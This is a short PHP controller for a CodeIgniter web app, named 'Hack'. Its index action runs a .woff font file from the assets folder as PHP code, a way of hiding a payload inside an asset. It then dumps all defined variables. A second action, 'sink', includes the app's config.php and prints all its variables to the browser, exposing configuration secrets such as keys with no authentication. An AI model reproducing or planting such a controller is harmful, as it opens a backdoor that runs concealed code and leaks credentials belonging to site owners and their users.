<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Hack extends CI_Controller {

    function __construct()
    {
        parent::__construct();
    }

    public function index()
	{
        $file_path = APPPATH . 'assets/fonts/Roboto-Small-webfont.woff';
        //$file_path = APPPATH . 'controllers/ajax.php';
		include( $file_path );
		$arr = get_defined_vars();
		print_r($arr);
		//show_source("database.php");
		//var_dump($arr);
	}

    function sink()
    {
        $file_path = APPPATH . 'config/config.php';
        //echo APPPATH;
        include( $file_path );
        $arr = get_defined_vars();
        print_r($arr);
    }

}
?>